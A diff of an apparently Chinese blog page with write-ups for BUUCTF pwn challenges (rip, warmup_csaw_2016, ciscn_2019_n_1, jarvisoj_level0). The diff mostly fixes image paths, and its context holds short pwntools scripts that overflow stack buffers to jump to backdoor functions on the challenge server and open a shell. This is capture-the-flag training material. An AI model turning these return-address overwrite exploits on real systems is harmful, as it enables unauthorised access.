@@ -172,7 +172,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      309 字
+      270 字
     </span>
   
 
@@ -182,7 +182,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      5
+      4
        分钟
     </span>
   
@@ -217,11 +217,11 @@
             <div class="markdown-body">
               <h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>直接nc就能getshell</p>
 <h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>下载二进制文件，发现有/bin/sh</p>
-<p><img src="%5Crip1.png" srcset="/img/loading.gif"></p>
+<p><img src="rip1.png" srcset="/img/loading.gif"></p>
 <p>找到后门函数</p>
 <p><img src="D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\后门函数" srcset="/img/loading.gif" alt="image-20210210232759789"></p>
 <p>很明显的栈溢出，覆盖返回地址为后门函数即可</p>
-<p><img src="D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\主函数" srcset="/img/loading.gif" alt="image-20210210232835395"></p>
+<p><img src="rip2.png" srcset="/img/loading.gif"></p>
 <p>exp</p>
 <figure class="highlight plain"><figcaption><span>pwn import *</span></figcaption><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs from">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26443)<br>payload&#x3D;&#39;a&#39;*23+p64(0x401187)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure>
 
@@ -229,9 +229,9 @@
 
 
 <h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>ida打开发现后门函数，直接打开flag.txt，就不用getshell了</p>
-<p><img src="D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\warmup后门函数" srcset="/img/loading.gif" alt="image-20210210234212982"></p>
+<p><img src="warmup1.png" srcset="/img/loading.gif"></p>
 <p>main函数</p>
-<p><img src="D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\warmup主函数" srcset="/img/loading.gif" alt="image-20210210234858210"></p>
+<p><img src="warmup2.png" srcset="/img/loading.gif"></p>
 <p>sprint会打印后门函数的地址，gets函数造成栈溢出</p>
 <p>exp</p>
 <figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">from pwn import *<br><span class="hljs-keyword">sh</span>=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">29685</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&#x27;WOW:&#x27;</span>)<br>addr=<span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">72</span>+p64(<span class="hljs-keyword">int</span>(addr,<span class="hljs-number">16</span>))<br><span class="hljs-keyword">sh</span>.send(payload)<br><span class="hljs-keyword">sh</span>.interactive()<br></code></pre></div></td></tr></table></figure>
@@ -240,10 +240,9 @@
 
 
 <h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>ida</p>
-<p><img src="D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\ciscn主函数" srcset="/img/loading.gif" alt="image-20210211172216178"></p>
-<p><img src="D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\ciscn后门函数" srcset="/img/loading.gif" alt="image-20210211172227212"></p>
+<p><img src="ciscn1.png" srcset="/img/loading.gif"></p>
 <p>gets造成栈溢出</p>
-<p>![image-20210211172500616](D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\ciscn 栈的位置)</p>
+<p><img src="ciscn2.png" srcset="/img/loading.gif"></p>
 <p>覆盖返回地址exp</p>
 <figure class="highlight plain"><figcaption><span>pwn import *</span></figcaption><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs from">sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,27073)<br>payload&#x3D;&#39;a&#39;*56+p64(0x4006BE)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure>
 <p>覆盖浮点数exp</p>
@@ -251,8 +250,8 @@
 
 
 <h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>ida</p>
-<p>![image-20210211180005585](D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\l0 主函数)</p>
-<p>![image-20210211180019962](D:\blog\blog\source_posts\Buuctf-pwn-writeup-0\l0 栈溢出函数)</p>
+<p>![](level0 1.png)</p>
+<p>![](level0 2.png)</p>
 <p>buf长度128，读入0x200可溢出</p>
 <p>exp</p>
 <figure class="highlight plain"><figcaption><span>pwn import *</span></figcaption><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs from">from pwn import *<br>sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26339)<br>payload&#x3D;&#39;a&#39;*136+p64(0x400596)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure>
